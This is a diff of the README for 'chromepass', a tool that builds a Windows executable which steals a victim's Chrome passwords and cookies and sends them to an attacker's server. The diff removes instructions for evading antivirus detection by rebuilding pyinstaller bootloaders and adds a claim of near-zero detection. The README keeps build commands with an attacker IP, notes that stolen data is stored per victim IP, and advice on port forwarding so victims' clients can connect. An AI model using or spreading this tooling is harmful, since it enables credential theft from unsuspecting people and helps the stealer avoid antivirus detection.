@@ -62,26 +62,12 @@ Chromepass is a python-based console application that generates a windows execut
 
 ---
 
-### AV Detection!
-This can be undetected with a very easy step, detailed below. It is detected mainly because many AVs get tripped by the popular signatures of pyinstaller. To mitigate this, you can build the bootloaders manually. You can do this on a clean VM if you wish:
- - Go through the [Installation](#installation) first
- - Open an administrator powershell
- - Run the following code and wait for it to finish, it might take a while: 
-```powershell
-Set-ExecutionPolicy remotesigned -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')); choco install -y python vcbuildtools git
-```
- - Close the powershell window and open a new one as administrator again.
- - Go into the chromepass directory, if you're not in it already.
- - Run the following code: 
-  ```powershell
-     git clone https://github.com/pyinstaller/pyinstaller.git
-     pip uninstall pyinstaller -y
-     cd pyinstaller/bootloader
-     python waf all
-     cd ..
-     pip install .
-  ```
- - Now you can follow the [Usage](#usage) normally and your executable is no longer detected by most AVs. There are some additional things you can do to make it completely undetectable. I'll leave you to discover what some of those things are.  
+### AV Detection!  
+
+The new client build methodology, practically ensures a 0% detection rate, even without AV-evasion tactics. If this becomes false in the future, some methods will be implemented to improve AV evasion.  
+
+An example of a scan: [VirusTotal Scan](https://www.virustotal.com/gui/file/dc05e7ca72c08e22e5ab2254f007bfdaf631bd6244d9c241bf6fafb907915e10/detection)   
+
  ---
 ## Getting started
 
@@ -89,13 +75,13 @@ Set-ExecutionPolicy remotesigned -Force; [System.Net.ServicePointManager]::Secur
 
 This is a very simple application, which uses only:
 
-* [Python] - Tested on python 3.6+
+* [Python] - Tested on python 3.9+
 
->Optionally, you may want to run all python commands inside a python virtual environment. For more information, check [Virtual Environment Guide](#virtual-environment-guide)
+>It recommended to perform the installation inside a Windows VM. Some parts of the installation procedure might be affected by existing configurations. This was tested on a clean Windows 10 VM.
 
 ### Installation
 
-Chromepass requires Windows to run! Support for linux and macOS may be added soon
+Chromepass requires Windows to run! Support for linux and macOS may be added soon.
 
 Clone the repository:
 ```powershell
@@ -104,17 +90,15 @@ git clone https://github.com/darkarp/chromepass
 
 Install the dependencies:
 
+Open an Admin powershell window and navigate to the chromepass folder.
 ```powershell
-cd chromepass
-pip install -r requirements.txt
+python create.py --setup
 ```
+If you're installing on clean VM or if you don't have the dependencies, this will take a long time. Go grab some coffee.  
 
-If any errors occur make sure you're running on the proper environment (if applcable) and that you have python 3.6+
-If the errors persist, try:
-```powershell
-python -m pip install --upgrade pip
-python -m pip install -r requirements.txt
-```  
+After the installation finished, make sure you close that powershell window and open a new one (doesn't need administrator privileges).  
+
+This will make sure the environment variables are refreshed.  
 
 ---
 
@@ -130,51 +114,33 @@ Running without any parameters will build the server and the client connecting t
 
 A simple example of a build:
 ```powershell
-python create.py --ip 92.34.11.220 --error --message "An Error has happened"
+python create.py --ip 92.34.11.220 --error --message An Error has happened
 ```
 
 After creating the server and the client, make sure you're running the server when the client is ran.
 
 The cookies and passwords will be saved in `json` files on a new folder called `data` in the same directory as the server, separated by ip address.
 
-If you'd like additional notes on evading AV, refer to [AV Detection](#av-detection)  
+
 
 ### Remote Notes
 >If you'd like to use this in a remote scenario, you must also perform port forwarding (port 80 by default), so that when the victim runs the client it is able to connect to the server on the correct port.  
 For more general information, click [here](https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/). If you're still not satisfied, perform a google search.
 
 ---
-## Virtual Environment Guide
-Virtual environments are essentially local, isolated, python installations with its own set of libraries, that you can activate or deactivate at any time, so as to not interfere with other python configurations. 
 
-To create a virtual environment you may use a package manager, such as `conda` (through miniconda or anaconda), or you may do so with the built-in python module `venv`. 
+## Manual dependency installation
 
-As an example, this creates a virtual environment called `chromepass_env`
-```powershell
-python -m venv chromepass_env
-```
-You should now have a folder with this name. To activate this environment:
+The automated setup is experimental. For one reason or another, the setup might fail to correctly install the dependencies. If that's the case, you must install them manually.  
+Fortunately, there are only 2 dependencies:  
+  - Microsoft Visual C++ Build Tools 2015
+  - [Rustup](https://rustup.rs/)
 
-* Windows Powershell
-  ```powershell
-  .\chromepass_env\Scripts\Activate.ps1
-  ```
-* Linux
-  ```powershell
-  source chromepass_env/bin/activate
-  ```
+To install the build tools, you can either install [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2017) and during installation, select the build tools, or you can install it via [Chocolatey](https://chocolatey.org/). To install it via chocolatey, you must first follow the installation instructions on their website and then run the command `choco install vcbuildtools`. 
 
+After successfully installing the build tools, you can simply run the `rustup-init.exe` from [Rustup](https://rustup.rs/)'s website.
 
-You should now see this name inside parenthesis on the left side of your powershell prompt, before the current working path.
-
-Every python command and installation command you perform will be done inside this environment. To deactivate it:
-```powershell
-deactivate
-```
-
-When using a virtual environment, remember that every time you open a new powershell window, the environment needs to be activated again, if you wish to use it.
-
->Using a virtual environment is not necessary, though it is recommended if you deal with many python projects, as a tool to better organize them.
+This completes the required dependencies and after closing and reopening the powershell window, you'll be able to use ChromePass.  
 
 ---
 
